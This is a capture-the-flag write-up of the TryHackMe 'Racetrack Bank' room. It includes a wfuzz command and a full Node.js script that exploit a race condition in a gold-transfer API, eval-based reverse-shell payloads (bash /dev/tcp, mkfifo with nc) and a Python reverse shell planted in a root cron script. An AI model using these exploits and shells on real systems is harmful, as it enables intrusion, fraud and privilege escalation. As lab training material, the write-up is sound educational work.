---
title: "Racetrack Bank - TryHackMe"
date: 2026-09-09 09:09:09 +0545

description: "A detailed walkthrough of exploiting a race condition, achieving Node.js RCE, and escalating privileges through a vulnerable cron job."

categories: [Web, Linux ]
tags: [web, linux, nmap, burpsuite, race-condition, nodejs, RCE, cronjob]

image:
  path: /assets/img/posts_thumbnails/racetrack_bank.png
  alt: "Racetrack Bank TryHackMe"

level: Hard
platform: TryHackMe
series: "Web Exploitation"  
  
room: "Racetrack Bank"
type: "CTF Write-up"
status: complete 
---

## Overview

This is a detailed walkthrough of how I rooted the **Racetrack Bank** room on TryHackMe and captured both  and flags.

Racetrack Bank is a Hard-rated TryHackMe room focused heavily on `web exploitation`, `race conditions`, `Node.js`, and `Linux privilege escalation`.

The initial foothold was the most challenging part of the machine. The application appeared relatively simple at first, but inspecting its behaviour and HTTP responses revealed an interesting clue that eventually led to a race condition vulnerability in the gold-transfer functionality.

By exploiting the race condition, I was able to accumulate enough gold to unlock the application's premium features. The premium functionality then exposed a Node.js code execution vulnerability, which provided an initial shell on the machine.

From there, standard Linux enumeration revealed a vulnerable cleanup script executed through a root-owned cron job, allowing me to escalate privileges and obtain the root flag.

---

## Reconnaissance

I started with a full TCP port scan combined with default scripts and service-version detection.

```bash
nmap -sC -sV -sS -p- -T4 -oN /home/kali/Desktop/THM_LAB/rooms/hard/racetrack_bank/scan.txt <target-ip>
```
The open ports are:

22/tcp   SSH
80/tcp   HTTP

![Nmap](/assets/images/writeups/racetrack_bank/1.png)

The presence of HTTP immediately made the web application the primary attack surface, while SSH could potentially become useful later if valid credentials were discovered.

---

## Web App Enumeration

Navigating to port 80 revealed the Racetrack Bank web application.

![website](/assets/images/writeups/racetrack_bank/2.png)

I created a normal user account named test and logged in. The dashboard displayed:
`Welcome to Racetrack Bank! To get you started, we have given you 1 gold (how generous of us!). Spend it wisely.`

![website](/assets/images/writeups/racetrack_bank/2.1.png)

The application therefore appeared to have some sort of virtual currency system.

### Interesting Page: Premium Features

Inspecting the dashboard source revealed a reference to `premiumfeatures.html`.However, accessing the page directly was not permitted with a normal account.

![website](/assets/images/writeups/racetrack_bank/2.2.png)

This suggested that the page was protected by some sort of authorization mechanism. The application also provided functionality for transferring gold between users. The login page contained an interesting message:
`Welcome to racetrack bank, the bank that (will soon) let you transfer funds with racing speed!`

![website](/assets/images/writeups/racetrack_bank/2.3.png)

At this point, the phrase "racing speed" became particularly interesting.

---

## Initial Foothold — Discovering the Race Condition

At this point, I started to use different tools and techniques to figure out where I could gain an initial foothold. This was perhaps the hardest part of this challenge and took me a while to figure out.

The transfer functionality became the most interesting attack surface. So i created another account named `test1`
I then logged in as test and attempted to transfer my initial 1 gold to `test1`. While intercepting the request with `Burpsuite`, I inspected the HTTP request and response carefully.

![website](/assets/images/writeups/racetrack_bank/3.png)

The response headers contained a particularly useful clue. The application was built using the `Express Node.js` framework.

Searching for `racetrack bank` alone doesn’t really help, but combining this hint with the knowledge that the website is using `Express Node.js Framework`, I decided to look for any `node.js packages` and found an exact match for `racetrack` and the application also appeared to be associated with a Node.js package named racetrack.

The description for the package reads:

`Racetrack is a way to make sure that all your async calls are completed, and to find out where they went wrong if any of them are not completed. It’s meant to be easy to drop in for classes that have a bunch of methods whose last parameter are all a function. Otherwise you’ll have to preface each function with a trace hook. It’s still pretty raw`

then i started googling `Race Condition` and exploit for it. lets see what i researched.

### Computer Science Example:

`Race conditions are most commonly associated with computer science. In computer memory or storage, a race condition may occur if commands to read and write a large amount of data are received at almost the same instant, and the machine attempts to overwrite some or all of the old data while that old data is still being read. The result may be one or more of the following: a computer crash, an “illegal operation,” notification and shutdown of the program, errors reading the old data or errors writing the new data. A race condition can also occur if instructions are processed in the incorrect order.`
### Security Vulnerability:

`A race condition occurs when two or more threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don’t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are “racing” to access/change the data.`

### Exploiting the Race Condition

Now that we have a potential exploit, the next step is to figure out where to use it and how. We know that to access the premium features, 10,000 gold is required. I also know that the website allows one user to give gold to another user, which could be where a race condition can be found and exploited.

In theory, this functionality can be exploited through race conditions by sending multiple POST requests at the same time rather than send one POST request at a time. This can be exploited by using ffuf. Simply create a long list containing the number 1 on each newline and pass it to ffuf which will use it to fuzz the amount parameter. This will work because ffuf will send multiple asynchronous POST requests without waiting for a response. In the example below, I am making a POST request to send `1 gold` from `test` to `test1` multiple times.

i created file which will be the input for fuzzing the gold value

```bash
seq 1 11000 > gold.txt 
```
OR

```bash
printf '1\n%.0s' {1..11000} > amounts.txt
```

```bash
wfuzz -c -w gold.txt -u http://racetrackbank.thm/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AG0LRqJLIISi4U2pM_dnywMfkxdWWYxKF.yoSW5jnWn%2BurFCIjqpweh5HSpINX7q2FoBkk3DudZDU" -d "user=test&amount=FUZZ"
```
![race_condition](/assets/images/writeups/racetrack_bank/3.1.png)

### key concept

                    Shared balance
                         │
             ┌───────────┴───────────┐
             │                       │
        Request A                Request B
             │                       │
             └─── race condition ────┘
                         │
                         ▼
                inconsistent state
                         │
                         ▼
                  duplicated gold
                  
                  
The important part of the request is `POST /api/givegold` with `user=test1` `amount=FUZZ` and the large number of requests created many concurrent opportunities for the vulnerable balance-handling logic to be triggered.
After the requests completed, I logged into the `test1` account and observed that the amount of gold received was significantly greater than expected. This confirmed that the transfer functionality could be abused through a race condition.

![race_condition](/assets/images/writeups/racetrack_bank/3.2.png)

### Automating the Exploit

I could continue to use this back and forth approach and increase the amounts being sent but since It was messy process, I decided to create a simple python script which would automate the process for me.

This script is used to send gold from one user’s account to another user’s account on the Racetrack Bank Website. It exploits the race condition vulnerability, whereby instead of sending one POST request at a time and waiting for a response (i.e. Synchronous), multiple POST requests are sent at the same time (Asynchronous). These requests are all handled individually before a response to the first request can be sent back, resulting in multiple requests being processed and gold being sent to the users.

```bash
nano exploit_race_condition.js
```

```javascript
cconst CONCURRENT = 20;

// CHANGE THIS to your Racetrack Bank machine IP
const SITE_URL = "http://10.10.10.10";


// --------------------------------------------------
// Login and get session cookie
// --------------------------------------------------
async function getAuthCookie(username, password) {
    const response = await fetch(`${SITE_URL}/api/login`, {
        method: "POST",

        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },

        body: new URLSearchParams({
            username: username,
            password: password
        }),

        redirect: "manual"
    });

    // Node versions differ in how Set-Cookie is exposed
    let cookie;

    if (typeof response.headers.getSetCookie === "function") {
        const cookies = response.headers.getSetCookie();
        cookie = cookies[0];
    } else {
        cookie = response.headers.get("set-cookie");
    }

    if (!cookie) {
        throw new Error(
            `No session cookie received for ${username}. HTTP status: ${response.status}`
        );
    }

    // Keep only: session=xxxx
    return cookie.split(";")[0];
}


// --------------------------------------------------
// Get current gold amount
// --------------------------------------------------
async function getGoldAmount(cookie) {
    const response = await fetch(`${SITE_URL}/home.html`, {
        headers: {
            "Cookie": cookie
        }
    });

    if (!response.ok) {
        throw new Error(
            `Could not access home.html. HTTP status: ${response.status}`
        );
    }

    const body = await response.text();

    const marker = "Gold: ";
    const start = body.indexOf(marker);

    if (start === -1) {
        throw new Error("Could not find Gold amount in home.html");
    }

    const valueStart = start + marker.length;

    // Find the end of the gold value
    const end = body.indexOf("</a>", valueStart);

    if (end === -1) {
        throw new Error("Could not find end of Gold value");
    }

    const goldText = body
        .substring(valueStart, end)
        .trim();

    const gold = parseInt(goldText, 10);

    if (Number.isNaN(gold)) {
        throw new Error(`Invalid gold value: ${goldText}`);
    }

    return gold;
}


// --------------------------------------------------
// Send gold normally
// --------------------------------------------------
async function sendGold(cookie, targetUser, amount) {
    const response = await fetch(`${SITE_URL}/api/givegold`, {
        method: "POST",

        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": cookie
        },

        body: new URLSearchParams({
            user: targetUser,
            amount: String(amount)
        }),

        redirect: "manual"
    });

    return response.status;
}


// --------------------------------------------------
// Race condition
// Send 20 requests at almost the same time
// --------------------------------------------------
async function raceSend(cookie, targetUser, amount) {

    console.log(
        `[+] Sending ${CONCURRENT} concurrent requests: ` +
        `transfer ${amount} gold -> ${targetUser}`
    );

    const requests = [];

    for (let i = 0; i < CONCURRENT; i++) {
        requests.push(
            sendGold(cookie, targetUser, amount)
        );
    }

    const results = await Promise.all(requests);

    console.log(
        `[+] Requests completed. Status codes: ${results.join(", ")}`
    );
}


// --------------------------------------------------
// Main
// --------------------------------------------------
async function main() {

    console.log("========================================");
    console.log("     Racetrack Bank Race Condition");
    console.log("========================================");

    console.log("\n[+] Target:", SITE_URL);

    // ----------------------------------------------
    // YOUR USERNAMES AND PASSWORDS
    // ----------------------------------------------

    const username1 = "test";
    const password1 = "password123";

    const username2 = "test1";
    const password2 = "password123";


    // ----------------------------------------------
    // Login
    // ----------------------------------------------

    console.log("\n[+] Logging in as:", username1);

    const user1 = await getAuthCookie(
        username1,
        password1
    );

    console.log("[+] test login successful");


    console.log("[+] Logging in as:", username2);

    const user2 = await getAuthCookie(
        username2,
        password2
    );

    console.log("[+] test1 login successful");


    // ----------------------------------------------
    // Get initial gold
    // ----------------------------------------------

    let gold1 = await getGoldAmount(user1);

    console.log(
        `\n[+] ${username1} starting gold: ${gold1}`
    );


    // ----------------------------------------------
    // Race loop
    // ----------------------------------------------

    while (gold1 < 10000) {

        console.log("\n----------------------------------------");

        console.log(
            `[+] ${username1} currently has ${gold1} gold`
        );


        // ==========================================
        // test -> test1
        // ==========================================

        console.log(
            `[+] Racing ${gold1} gold: ` +
            `${username1} -> ${username2}`
        );

        await raceSend(
            user1,
            username2,
            gold1
        );


        // ------------------------------------------
        // Check test1's gold
        // ------------------------------------------

        const gold2 = await getGoldAmount(user2);

        console.log(
            `[+] ${username2} now has: ${gold2} gold`
        );


        // ==========================================
        // test1 -> test
        // ==========================================

        console.log(
            `[+] Racing ${gold2} gold: ` +
            `${username2} -> ${username1}`
        );

        await raceSend(
            user2,
            username1,
            gold2
        );


        // ------------------------------------------
        // Check test's new gold
        // ------------------------------------------

        gold1 = await getGoldAmount(user1);

        console.log(
            `[+] ${username1} now has: ${gold1} gold`
        );
    }


    // ----------------------------------------------
    // Finished
    // ----------------------------------------------

    console.log("\n========================================");
    console.log("             DONE!");
    console.log("========================================");

    console.log(
        `[+] ${username1} final gold: ${gold1}`
    );

    console.log(
        "[+] You should now be able to purchase Premium."
    );
}


// --------------------------------------------------
// Error handling
// --------------------------------------------------

main().catch(error => {

    console.error("\n[-] ERROR:");
    console.error(error.message);

});
```
```bash
node exploit_race_condition.js
```
This script can take a few minutes to run but will eventually give us the gold we need to buy the premium features.

---

## Premium Features → Node.js RCE

With enough gold, I purchased the premium account and gained access to the previously restricted Premium Features page.

![Features](/assets/images/writeups/racetrack_bank/4.png)

The page contained an input that evaluated mathematical expressions and returned the result.

Since the application was built with Node.js, I tested whether the expression evaluator could access Node.js functionality. I started with `process.cwd()`.

```bash
process.cwd()
```
This returned the current working directory of the application which was an important finding because it demonstrated that the input was not simply performing basic mathematical calculations — JavaScript expressions were being evaluated and the next objective was to determine whether this could be escalated to operating-system command execution.

### Achieving Command Execution

Node.js provides the child_process module, which can execute system commands. I therefore tested `require("child_process").exec(...)` this provided a path to OS command execution.

So For the lab environment, I used a reverse shell payload:

```bash
require("child_process").exec("bash -c 'exec bash -i &>/dev/tcp/<attacker-ip>/4444 <&1'")
```
Alternatively:

```bash
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 4444 >/tmp/f')
```
![RCE](/assets/images/writeups/racetrack_bank/5.png)

With shell access, I began enumerating the application files and inspecting its source code which was the cause for RCE.

![RCE](/assets/images/writeups/racetrack_bank/5.1.png)

The source code helped explain the functionality behind the premium feature and also revealed useful information about the application's configuration. I also discovered database credentials during enumeration.

![shell](/assets/images/writeups/racetrack_bank/6.png)

After locating the appropriate flag file, I obtained the user flag.

![flag](/assets/images/writeups/racetrack_bank/7.png)

---

## Privilege Escalation

With the user shell established, I moved on to Linux privilege escalation. As usual, I started with common privilege-escalation checks.

### SUID Enumeration

I searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```
![suid_binary](/assets/images/writeups/racetrack_bank/8.png)

There was an interesting SUID binary, but after investigating its behaviour, it did not provide a practical path to root.

### Linux Capabilities

I also checked for binaries with Linux capabilities:

```bash
getcap -r / 2>/dev/null
```
![capabilities](/assets/images/writeups/racetrack_bank/9.png)

Although capabilities can sometimes provide an easy privilege-escalation path, the results here did not immediately lead to root. This was a good reminder not to focus exclusively on SUID binaries and capabilities. So i continued with broader system enumeration.

### Discovering the Root Cron Job

While looking for processes that were being executed periodically, I used `pspy64` to monitor processes without requiring root privileges. I transferred pspy64 to the target.

```bash
python3 -m http.server 80
wget http://<attacker-ip>/pspy64
chmod +x pspy64
```
![pspy64](/assets/images/writeups/racetrack_bank/10.png)

Running pspy64 revealed a recurring cleanup process. This was particularly interesting because it showed a script being executed automatically by a privileged process.

### Cron Job Exploitation

Further investigation revealed a cleanup script `/home/brian/cleanup/cleanupscript.sh`

![cleanupscript](/assets/images/writeups/racetrack_bank/11.png)

The important question was not simply `"What script is being executed?"`, but `Who executes it, and can I modify the script before it runs?` And the script was being executed with elevated privileges while being `writable/modifiable` from my current context. which created the classic cron privilege-escalation opportunity.

I saved backup of the original file and created the new file with the same name, added the contents of the script with a reverse-shell command:

```bash
cat > cleanupscript.sh <<'EOF'
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.132.132",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
EOF
```
![shell](/assets/images/writeups/racetrack_bank/12.png)

I then waited for the cron job to execute. A connection was received on my listener, this time with root privileges. Finally, with a root shell, I was able to access the root flag.

![flag](/assets/images/writeups/racetrack_bank/13.png)

---

🖼️ **All process screenshot** ![all_process_screenshort](/assets/images/writeups/racetrack_bank/all_process.png)

---

## Conclusion

Racetrack Bank was one of the more interesting web-focused rooms I have worked on because the initial foothold was not immediately obvious.

The biggest takeaway for me was the race condition vulnerability. Instead of relying only on traditional techniques such as directory brute-forcing or version-based exploitation, the challenge required understanding how concurrent requests could affect application state.

The second major lesson was the importance of understanding the technology behind an application. Recognizing that the target was using Node.js made the JavaScript evaluation vulnerability much more interesting and ultimately led to command execution.

Finally, the privilege-escalation stage reinforced the value of systematic Linux enumeration. When SUID and capabilities did not immediately work, monitoring running processes exposed the vulnerable cron job.

Overall, the room gave me practical experience with:

✓ `Web application enumeration`
✓ `Burp Suite`
✓ `HTTP request analysis`
✓ `Race conditions`
✓ `Concurrent requests`
✓ `Node.js`
✓ `JavaScript evaluation`
✓ `Remote Code Execution`
✓ `Reverse shells`
✓ `Linux enumeration`
✓ `pspy64`
✓ `Cron privilege escalation`
✓ `SUID enumeration`
✓ `Linux capabilities`

Racetrack Bank was a great reminder that sometimes the most interesting vulnerabilities are hidden inside functionality that initially appears completely normal.

*Thanks for reading!*
